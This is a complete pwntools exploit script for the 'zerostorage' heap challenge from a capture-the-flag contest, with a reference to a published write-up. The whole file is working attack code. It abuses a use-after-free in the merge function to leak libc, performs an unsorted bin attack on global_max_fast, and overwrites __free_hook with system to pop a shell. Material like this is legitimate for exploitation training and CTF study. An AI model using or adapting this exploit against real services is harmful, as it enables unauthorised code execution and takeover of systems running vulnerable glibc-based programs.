#!/usr/bin/env python
from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

local = 1
if local:
    p = process('./zerostorage')
    elf = ELF('./zerostorage')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote('127.0.0.1', 8888)
    elf = ELF('./zerostorage')
    libc = ELF('./libc.so.6')

def choice(c):
    p.sendlineafter('Your choice: ', str(c))

def insert(sz, data):
    choice(1)
    p.sendlineafter('Length of new entry: ', str(sz))
    p.sendafter('Enter your data: ', data)

def update(idx, sz, data):
    choice(2)
    p.sendlineafter('Entry ID: ', str(idx))
    p.sendlineafter('Length of entry: ', str(sz))
    p.sendafter('Enter your data: ', data)

def merge(idx1, idx2):
    choice(3)
    p.sendlineafter('Merge from Entry ID: ', str(idx1))
    p.sendlineafter('Merge to Entry ID: ', str(idx2))

def delete(idx):
    choice(4)
    p.sendlineafter('Entry ID: ', str(idx))

def view(idx):
    choice(5)
    p.sendlineafter('Entry ID: ', str(idx))

# # References
# - https://guyinatuxedo.github.io/31-unsortedbin_attack/0ctf16_zerostorage/index.html

# leak libc
insert(0x20, 0x20 * 'A') # 0
insert(0xf8, 0xf8 * 'B') # 1
merge(0, 0) # 2 <- use after free
view(2)
p.recvuntil('Entry No.2:\n')
unsorted_bin = u64(p.recv(6).ljust(8, '\x00'))
info('unsorted_bin = ' + hex(unsorted_bin))
libc_base = unsorted_bin - 0x3c4b78
info('libc_base = ' + hex(libc_base))
global_max_fast = libc_base + 0x3c67f8
info('global_max_fast = ' + hex(global_max_fast))

# unsorted bin attack
update(2, 0x20, 8 * 'C' + p64(global_max_fast - 0x10) + 0x10 * 'C')
insert(0x20, '/bin/sh\x00'.ljust(0x20, 'D')) # 0 -> for getting shell

# get shell
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']
target = free_hook - 0x59
merge(1, 1) # 3
update(3, 0x1f8, p64(target).ljust(0x1f8, 'E'))
insert(0x1f8, 0x1f8 * 'F')
insert(0x1f8, (0x49 * '\x00' + p64(system)).ljust(0x1f8, '\x00'))
delete(0)

gdb.attach(p)

p.interactive()

